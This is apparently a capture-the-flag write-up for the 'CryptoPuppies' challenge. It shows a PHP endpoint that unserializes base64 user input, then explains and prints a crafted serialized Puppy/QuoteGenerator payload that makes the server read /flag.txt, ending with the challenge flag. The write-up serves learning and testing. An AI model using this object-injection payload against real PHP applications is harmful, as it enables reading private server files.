# CryptoPuppies
The challenge CryptoPuppies is one on serialization.
The goal of the exploit is to create a serialized object that, once de-serialized in the server, executes arbitrary instructions.

## Vulnerability
The vulnerability is located in ```src/img.php```. 
```php
<?php
include 'data.php';

$b64puppy = $_GET['puppy'];
// decode
$puppy = base64_decode($b64puppy);
$puppy = unserialize($puppy);
$puppy->getImg();
?>
```
This php code de-serializes the object in input without sanitizing it. 
Therefore, arbitrary code can be executed, thanks to the call to getImg().

## Exploit
In the attached file ```crypto_exploit.php```, an object of the class Puppy is created.
The ```__construct``` is modified to take for input a string, that then uses as quote.
Also, a custom QuoteGenerator class is used, and has as path of the file of the quotes, the one that contains the flag. 
It then still picks a random one - although there is only one in the file - and then prints it on the image.

This object is then declared, serialized and then the base64 representation is echoed.

The code is then compiled using a PHP compiler/interpreter, and the output is submitted in the website. 
The flag is printed on the image.

### Object
```
O:5:"Puppy":4:{s:8:"eyeColor";a:3:{i:0;i:28;i:1;i:160;i:2;i:131;}s:7:"eyeSize";i:57;s:10:"background";a:3:{i:0;i:235;i:1;i:89;i:2;i:233;}s:5:"quote";O:14:"QuoteGenerator":1:{s:9:"quoteFile";s:9:"/flag.txt";}}Tzo1OiJQdXBweSI6NDp7czo4OiJleWVDb2xvciI7YTozOntpOjA7aToyODtpOjE7aToxNjA7aToyO2k6MTMxO31zOjc6ImV5ZVNpemUiO2k6NTc7czoxMDoiYmFja2dyb3VuZCI7YTozOntpOjA7aToyMzU7aToxO2k6ODk7aToyO2k6MjMzO31zOjU6InF1b3RlIjtPOjE0OiJRdW90ZUdlbmVyYXRvciI6MTp7czo5OiJxdW90ZUZpbGUiO3M6OToiL2ZsYWcudHh0Ijt9fQ==
```

### Flag
flag{what_a_nice_puppy_you_got!You_can_bring_him_home_now}